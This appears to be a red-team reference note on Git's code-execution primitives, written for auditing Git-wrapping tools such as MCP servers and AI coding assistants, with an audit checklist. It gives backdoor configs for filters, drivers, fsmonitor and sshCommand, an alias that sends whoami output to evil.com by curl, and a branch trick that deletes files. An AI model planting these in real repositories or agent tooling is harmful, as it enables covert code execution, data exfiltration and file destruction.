# Git Execution Primitives for Red Teaming

**Category:** Domain-Specific Exploitation / CLI Wrapper Attacks
**Relevance:** MCP Server Audits, AI Agent Security, Supply Chain Attacks
**Severity:** Critical (when combined with write access)
**Last Updated:** 2026-02-03
**Source:** Learned from Cyata Security's mcp-server-git research (shadow exercise gap analysis)

## Overview

Git has multiple code execution primitives beyond the obvious (hooks). When auditing any tool that wraps Git operations (MCP servers, CI/CD pipelines, AI coding assistants), ALL execution paths must be enumerated.

## Execution Primitives

### 1. Git Hooks (Well-Known)
**Location:** `.git/hooks/`
**Trigger:** Various git events (pre-commit, post-checkout, post-merge, etc.)
**Requirement:** ⚠️ Execute bit required
**Files:** pre-commit, post-commit, pre-push, post-checkout, pre-rebase, post-merge, etc.

### 2. Clean/Smudge Filters (CRITICAL — Often Missed)
**Location:** `.git/config` + `.gitattributes`
**Trigger:** git add (clean) or git checkout (smudge)
**Requirement:** ✅ NO execute bit needed — runs via shell
**Configuration:**
```ini
# .git/config
[filter "backdoor"]
    clean = sh /tmp/payload.sh
    smudge = sh /tmp/payload.sh

# .gitattributes
*.txt filter=backdoor
```
**Why this matters:** This is the bypass when hooks can't be used because the execute bit can't be set (e.g., Filesystem MCP server, Windows, etc.).

### 3. Git Aliases with Shell Commands
**Location:** `.git/config` or `~/.gitconfig`
**Trigger:** When the aliased command is invoked
**Configuration:**
```ini
[alias]
    backdoor = !sh -c 'curl http://evil.com/exfil?data=$(whoami)'
```

### 4. Git Attributes — Diff/Merge Drivers
**Location:** `.git/config` + `.gitattributes`
**Trigger:** git diff or git merge operations
**Configuration:**
```ini
[diff "backdoor"]
    command = /tmp/malicious-diff-driver.sh
[merge "backdoor"]
    driver = /tmp/malicious-merge-driver.sh %O %A %B
```

### 5. Git Config — core.fsmonitor
**Location:** `.git/config`
**Trigger:** Many git commands (status, add, etc.) — acts as background watcher
**Configuration:**
```ini
[core]
    fsmonitor = /tmp/payload.sh
```

### 6. Git Config — core.sshCommand
**Location:** `.git/config`
**Trigger:** git fetch, git push (any remote operation)
**Configuration:**
```ini
[core]
    sshCommand = /tmp/payload.sh
```

### 7. Branch Working Tree Manipulation (File Destruction)
**No config needed — pure Git semantics:**
1. git_init at target directory
2. git_add + git_commit on branch A
3. git_branch to create branch B, checkout B
4. git_add target_file on branch B + commit
5. git_checkout back to branch A
6. → target_file removed from working directory (still in .git objects)

**Why it works:** Git's branch switching removes files tracked on branch B but not on branch A from the working tree. This is NORMAL behavior, weaponized.

## Audit Checklist for Git-Wrapping Tools

1. [ ] Can the tool create .git directories? (git_init) → Check path restrictions
2. [ ] Can the tool write to .git/config? → Check for filter/hook/alias injection
3. [ ] Can the tool write to .gitattributes? → Check for filter assignments
4. [ ] Are CLI arguments sanitized? → Check for --exec, --output, -c flag injection
5. [ ] Can external tools (Filesystem MCP, IDE) write to .git/? → Cross-tool chaining
6. [ ] Is core.fsmonitor used? → Potential persistent execution
7. [ ] Is core.sshCommand configurable? → Execution via remote operations
8. [ ] Can branch operations delete files? → Working tree manipulation

## Key Insight

**The execute bit is NOT a reliable security boundary for Git.**
Clean/smudge filters, fsmonitor, sshCommand, and aliases all execute via shell without needing the execute bit on any file. Any audit that stops at "hooks need +x, so we're safe" is incomplete.

## References

- Cyata Security, "Breaking Anthropic's Official MCP Server" (Jan 2026)
- Git Documentation: gitattributes, githooks, git-config
- CVE-2025-68143, CVE-2025-68144, CVE-2025-68145
